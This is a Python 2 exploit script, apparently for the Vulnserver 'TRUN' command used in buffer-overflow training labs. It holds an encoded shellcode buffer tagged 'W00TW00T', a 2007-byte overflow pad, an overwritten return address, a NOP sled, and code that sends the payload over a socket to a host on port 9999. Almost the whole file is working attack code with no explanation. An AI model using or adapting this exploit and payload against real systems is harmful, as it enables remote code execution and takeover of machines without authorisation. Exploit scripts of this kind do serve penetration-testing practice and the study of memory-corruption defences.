#!/usr/bin/env python

import sys
import socket

buf  = "W00TW00T"
buf += "\xdb\xc4\xba\x28\xeb\xad\x16\xd9\x74\x24\xf4\x5b"
buf += "\x2b\xc9\xb1\x52\x83\xeb\xfc\x31\x53\x13\x03\x7b"
buf += "\xf8\x4f\xe3\x87\x16\x0d\x0c\x77\xe7\x72\x84\x92"
buf += "\xd6\xb2\xf2\xd7\x49\x03\x70\xb5\x65\xe8\xd4\x2d"
buf += "\xfd\x9c\xf0\x42\xb6\x2b\x27\x6d\x47\x07\x1b\xec"
buf += "\xcb\x5a\x48\xce\xf2\x94\x9d\x0f\x32\xc8\x6c\x5d"
buf += "\xeb\x86\xc3\x71\x98\xd3\xdf\xfa\xd2\xf2\x67\x1f"
buf += "\xa2\xf5\x46\x8e\xb8\xaf\x48\x31\x6c\xc4\xc0\x29"
buf += "\x71\xe1\x9b\xc2\x41\x9d\x1d\x02\x98\x5e\xb1\x6b"
buf += "\x14\xad\xcb\xac\x93\x4e\xbe\xc4\xe7\xf3\xb9\x13"
buf += "\x95\x2f\x4f\x87\x3d\xbb\xf7\x63\xbf\x68\x61\xe0"
buf += "\xb3\xc5\xe5\xae\xd7\xd8\x2a\xc5\xec\x51\xcd\x09"
buf += "\x65\x21\xea\x8d\x2d\xf1\x93\x94\x8b\x54\xab\xc6"
buf += "\x73\x08\x09\x8d\x9e\x5d\x20\xcc\xf6\x92\x09\xee"
buf += "\x06\xbd\x1a\x9d\x34\x62\xb1\x09\x75\xeb\x1f\xce"
buf += "\x7a\xc6\xd8\x40\x85\xe9\x18\x49\x42\xbd\x48\xe1"
buf += "\x63\xbe\x02\xf1\x8c\x6b\x84\xa1\x22\xc4\x65\x11"
buf += "\x83\xb4\x0d\x7b\x0c\xea\x2e\x84\xc6\x83\xc5\x7f"
buf += "\x81\x6b\xb1\xc5\xd4\x04\xc0\x39\xc6\x88\x4d\xdf"
buf += "\x82\x20\x18\x48\x3b\xd8\x01\x02\xda\x25\x9c\x6f"
buf += "\xdc\xae\x13\x90\x93\x46\x59\x82\x44\xa7\x14\xf8"
buf += "\xc3\xb8\x82\x94\x88\x2b\x49\x64\xc6\x57\xc6\x33"
buf += "\x8f\xa6\x1f\xd1\x3d\x90\x89\xc7\xbf\x44\xf1\x43"
buf += "\x64\xb5\xfc\x4a\xe9\x81\xda\x5c\x37\x09\x67\x08"
buf += "\xe7\x5c\x31\xe6\x41\x37\xf3\x50\x18\xe4\x5d\x34"
buf += "\xdd\xc6\x5d\x42\xe2\x02\x28\xaa\x53\xfb\x6d\xd5"
buf += "\x5c\x6b\x7a\xae\x80\x0b\x85\x65\x01\x61\xbc\x67"
buf += "\x2b\x1e\x99\xf2\x69\x43\x1a\x29\xad\x7a\x99\xdb"
buf += "\x4e\x79\x81\xae\x4b\xc5\x05\x43\x26\x56\xe0\x63"
buf += "\x95\x57\x21"

message  = "TRUN "

message += 'A' * 2007
message += '\xaf\x11\x50\x62'
message += '\x90' * 16

message += buf
message += 'C' * (4000-2007-4-16-len(buf))

message += '/.:/'
message += "\x00\x00\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

s.send(message)
